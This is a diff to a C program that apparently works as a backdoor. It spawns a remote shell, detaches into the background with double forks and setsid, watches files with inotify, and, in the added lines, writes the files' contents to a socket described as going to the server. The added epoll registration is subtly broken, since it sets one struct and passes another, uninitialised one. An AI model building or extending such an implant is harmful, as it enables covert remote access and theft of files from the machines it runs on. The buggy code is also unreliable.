@@ -337,6 +337,13 @@ int main(void) {
     unsigned char buffer[MAX_PAYLOAD];
     int remote_shell_sock = -1;
 
+    int local_socks[2];
+
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, local_socks) < 0) {
+        perror("socketpair");
+        exit(EXIT_FAILURE);
+    }
+
     if (!wrapped_fork()) {
         run_remote_shell();
     } else {
@@ -355,6 +362,7 @@ int main(void) {
     if (wrapped_fork()) {
         return EXIT_SUCCESS;
     }
+
     setsid();
     if (!wrapped_fork()) {
         if (wrapped_fork()) {
@@ -373,6 +381,10 @@ int main(void) {
         eve.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
         eve.data.fd = remote_shell_sock;
         add_epoll_socket(efd, remote_shell_sock, &eve);
+        struct epoll_event even;
+        eve.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
+        eve.data.fd = local_socks[0];
+        add_epoll_socket(efd, local_socks[0], &even);
 
         //sleep(3);
 
@@ -531,7 +543,8 @@ int main(void) {
                             perror("fread");
                             continue;
                         }
-                        //Crap, now what?
+                        //Write to server via local socket listening in epoll
+                        write(local_socks[1], file_buffer, file_size);
                     } else if (ie->mask & IN_CREATE) {
                         printf("%s was created\n", ie->name);
                         int wd;
